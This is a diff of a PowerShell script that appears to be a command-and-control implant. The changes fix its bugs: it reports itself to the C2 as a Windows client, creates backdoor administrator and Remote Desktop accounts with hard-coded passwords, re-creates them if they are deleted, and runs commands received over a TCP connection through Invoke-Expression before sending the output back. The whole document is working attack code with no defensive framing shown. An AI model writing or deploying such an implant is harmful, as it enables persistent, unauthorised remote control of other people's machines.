@@ -41,13 +41,15 @@ $tcpStream = $tcpConnection.GetStream()
 $reader = New-Object System.IO.StreamReader($tcpStream)
 $writer = New-Object System.IO.StreamWriter($tcpStream)
 $writer.AutoFlush = $true
+# First message tells the C2 if this client is a Windows or Linux Client
+$writer.WriteLine("Windows")
 
 # Add some extra users
-New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText)
+New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
 Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
 Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
 
-New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345" -AsPlainText)
+New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345" -AsPlainText -Force)
 Add-LocalGroupMember -Member "Doug" -Group "Administrators"
 Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
 
@@ -58,13 +60,13 @@ while($true){
     if($I -ge 4){
         $I = 0
         $Users = Get-LocalUser
-        if(!("Jimithy" -in $Users)){
-            New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
+        if(!("Jimithy" -in $Users.name)){
+            New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
             Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
             Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
         }
-        if(!("Doug" -in $Users)){
-            New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-123456")
+        if(!("Doug" -in $Users.name)){
+            New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
             Add-LocalGroupMember -Member "Doug" -Group "Administrators"
             Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
         }
@@ -75,8 +77,8 @@ while($true){
     Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"
 
     # Get commands from the C2, run them and send the output back
-    $command = $reader.Read()
-    $reply = & $command
-    $writer.write($reply)
+    $command = $reader.ReadLine()
+    $reply = Invoke-Expression $command
+    $writer.WriteLine($reply)
     $I++;
 }
